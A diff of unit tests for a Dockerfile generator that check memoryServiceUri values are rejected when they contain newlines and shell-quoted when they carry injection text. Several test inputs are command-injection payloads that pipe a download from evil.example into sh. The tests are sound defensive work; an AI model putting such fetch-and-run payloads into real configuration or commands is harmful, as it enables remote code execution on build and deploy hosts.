@@ -178,6 +178,15 @@ describe('createDockerFileContent', () => {
     }
   });
 
+  it('should reject memoryServiceUri containing a newline', () => {
+    expect(() =>
+      createDockerFileContent({
+        ...defaultOptions,
+        memoryServiceUri: 'rag://b\nRUN sh -c "curl evil.example|sh"\n#',
+      }),
+    ).toThrow(/Invalid memoryServiceUri/);
+  });
+
   it('should not echo a credentialed sessionServiceUri in the rejection message', () => {
     // The deploy commands log this Error's message, and a session service URI
     // carries its password in the userinfo, so the message must identify the
@@ -215,6 +224,16 @@ describe('createDockerFileContent', () => {
     );
     expect(content).toContain(
       "--artifact_service_uri='gs://bucket; curl evil.example | sh #'",
+    );
+  });
+
+  it('should shell-quote memoryServiceUri in the CMD line', () => {
+    const content = createDockerFileContent({
+      ...defaultOptions,
+      memoryServiceUri: 'rag://corpus; curl evil.example | sh #',
+    });
+    expect(content).toContain(
+      "--memory_service_uri='rag://corpus; curl evil.example | sh #'",
     );
   });
 
@@ -773,6 +792,18 @@ describe('deployToCloudRun', () => {
         expect.stringContaining(
           "--artifact_service_uri='gs://my-artifact-bucket' --session_service_uri='sqlite:///tmp/sessions.db'",
         ),
+      );
+    });
+
+    it('forwards memoryServiceUri into the generated Dockerfile CMD', async () => {
+      await deployToCloudRun({
+        ...defaultOptions,
+        memoryServiceUri: 'rag://my-corpus',
+      });
+
+      expect(saveToFile).toHaveBeenCalledWith(
+        path.join('/tmp/test-deploy', 'Dockerfile'),
+        expect.stringContaining("--memory_service_uri='rag://my-corpus'"),
       );
     });
   });
